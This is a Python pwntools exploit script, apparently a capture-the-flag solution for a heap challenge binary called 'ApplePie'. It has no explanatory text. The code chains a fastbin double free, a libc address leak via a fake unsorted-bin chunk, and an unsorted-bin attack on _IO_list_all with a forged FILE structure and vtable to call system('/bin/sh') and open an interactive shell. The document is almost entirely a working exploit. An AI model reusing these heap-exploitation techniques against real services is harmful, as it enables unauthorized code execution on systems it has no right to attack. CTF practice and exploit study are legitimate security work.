from pwn import *

g_fname = args.FNAME if '' != args.FNAME else "./ApplePie"
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
    g_io = process(g_fname)
else:
    g_io = remote()

g_libc = ELF(g_libcname)

def getpid():
    if (args.LOCAL):
        log.info("PID: %d", g_io.proc.pid)
        pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
    sla("Your choice :\n", str(idx))

def create(content, size):
    opt(1)
    sa("ApplePie size:\n", str(size))
    sa("Pie name:\n", content)

def delete(idx):
    opt(2)
    sla("ApplePie id:\n", str(idx))

def edit(content):
    opt(3)
    sa("New name:\n", content)

def pwn():
    fake_chunk_in_name = flat([
        0, 0xd1, 'a'*0xc0,
        0, 0x21, 'b'*0x10,
        0, 0x21
    ])
    sa("ApplePie, input your name:\n", fake_chunk_in_name)

    create("0", 0x10)
    create("1", 0x10)
    create("2", 0x10)
    
    # double free: make chunk_0->chunk_1->chunk_0->chunk_ptr_table(0x602140)
    delete(0)
    delete(1)
    delete(0)

    addr_chunk_ptr_table = 0x602140
    addr_fake_unsortedbin = 0x602040 # we built fake chunks in name to leak libc base.
    create(p64(addr_chunk_ptr_table - 0x10), 0x10) # slot 3
    create("re1", 0x10) # slot 4
    create("re0", 0x10) # slot 5
    # change the pointer in slot 0, make it points to the fake unsortedbin chunk.
    create(p64(addr_fake_unsortedbin+0x10), 0x10) # slot 6
    getpid()
    # free and leak libc's base address.
    delete(0)
    edit('A'*0x10)
    ru('A'*0x10)
    data = r(6)
    log.info("data=%s", data)
    libc_base = u64(data.ljust(8, b'\x00')) - 0x3c4b78

    g_libc.address = libc_base
    addr_system = g_libc.symbols["system"]
    addr_io_list_all = g_libc.symbols["_IO_list_all"]
    log.debug("libc@%#x\n\tsystem()%#x\n\t_IO_list_all@%#x"
        , libc_base
        , addr_system
        , addr_io_list_all
    )

    getpid()

    addr_fake_vtable = addr_fake_unsortedbin + 0xe0 - 3*0x8
    fake_FILE_plus = flat([
        "/bin/sh\x00", 
        0x61,
        0xdeadbeef, # fake chunk's fd
        # fake chunk's bk
        # unsortedbin attack make _IO_list_all = unsorted_chunks(av)
        addr_io_list_all - 0x10, 
        # fake _IO_write_base < _IO_write_ptr
        2, 3
    ])
    fake_FILE_plus = fake_FILE_plus.ljust(0xd8, b'\x00') + p64(addr_fake_vtable)
    payload = fake_FILE_plus + p64(addr_system)
    edit(payload)

    opt(1)
    sa("ApplePie size:\n", str(0x28))

if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()
